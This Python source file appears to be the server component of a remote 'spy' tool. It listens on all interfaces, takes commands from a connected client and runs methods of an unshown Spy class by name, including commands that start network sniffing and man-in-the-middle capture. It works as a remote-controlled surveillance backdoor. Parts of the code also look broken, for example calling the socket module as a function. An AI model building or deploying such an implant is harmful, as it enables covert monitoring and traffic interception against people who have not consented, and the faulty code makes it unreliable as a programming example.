from typing import Optional, Tuple
import socket
from consts import *
from . import *
from spying import Spy
from inspect import signature


class Server:
    def __init__(self):
        self.spy = Spy()
        self.socket = socket()
        self.client: Optional[socket.socket] = None
        self.client_address: Optional[Tuple[str, int]] = None
        self.client_live = False

    def wait_for_client(self):
        self.socket.bind(("0.0.0.0", PORT))
        while True:
            self.socket.listen()
            print(f"waiting for server")
            self.client, self.client_address = self.socket.accept()
            print(f"{self.client_address} has connected")
            self.client_live = True
            self.wait_for_command()

    def wait_for_command(self):
        while True:
            try:
                print(f"waiting for command")
                data = receive_msg(self.client)
            except ConnectionError:
                self.client_live = False
                return
            except ValueError:
                self.client_live = False
                return
            data = data.split(str(Massages.SEP.value))
            command, params = data[0], data[1::]
            result = self.execute_command(command, params)
            send(result, self.client)

    def execute_command(self, command: str, params: list) -> str:
        match command:
            case str(Massages.EXIT.value):
                return str(Massages.BYE.value)
            case "start_sniffing_on_net":
                if len(params) == 0:
                    return self.execute_command(command, [self.client_address[0], MITM_DEFAULT_PORT])
            case "start_sniffing_to_file":
                if len(params) == 1:
                    return self.execute_command(command, [params[0], self.client_address[0], MITM_DEFAULT_PORT])
            case "get_commands":
                return get_commands(Spy)




        # if command in SPY_COMMANDS:
        #     command = SPY_COMMANDS[command]
        function = getattr(self.spy, command, None)
        if not function:
            if command in OTHER_COMMANDS:
                pass
            return str(Massages.INVALID_COMMAND.value)
        if not is_valid_num_of_params(function, len(params)):
            return str(Massages.INVALID_NUMBER_OF_PARAMS.value)
        if not cast_params(function, params):
            return str(Massages.INVALID_PARAMS.value)
        try:
            result = function(*params)
        except Exception as e:
            print(e)
            return str(e)
        if isinstance(result, str):
            return result
        if isinstance(result, bool):
            return str(Massages.OK.value if result else Massages.NOT_OK.value)
        else:
            return str(result)


def is_valid_num_of_params(func: callable, num: int) -> bool:
    """
    checks if num is a valid number of params for func
    """
    sig = signature(func)
    maxi = len(sig.parameters)
    mini = 0
    for name, param in sig.parameters.items():
        if name == "self":
            maxi -= 1
        if param.default == param.empty:
            mini += 1
    return mini <= num <= maxi


def cast_params(func: callable, params: list) -> bool:
    """
    casting the list of string params to the right type.
    return whether succeeded or not.
    """
    sig = signature(func)
    i = 0
    for name, param in sig.parameters.items():
        if name == "self":
            continue
        if params[i] == Massages.DEFAULT_PARAM.value:
            if param.default == param.empty:
                return False
            params[i] = param.default
            i += 1
            continue
        if param.annotation == param.empty:
            i += 1
            continue
        try:
            params[i] = param.annotation(params[i])
            i += 1
        except Exception:
            return False
    return True


def get_commands(cls: type) -> str:
    """
    gets a class and return a message with all its methods and their params
    """
    method_list = [method for method in dir(cls) if not method.startswith('__')]
    msg = "the available commands are: \n"
    for method in method_list:
        msg += f"{method} - \n"
        sig = signature(getattr(cls, method))
        for name, param in sig.parameters.items():
            msg += f"\t{name}: \n" \
                   f"\t\tType: {param.annotation if param.annotation != param.empty else 'any'} \n" \
                   f"\t\tDefault: {param.default if param.default != param.empty else 'no default value'} \n"
    return msg
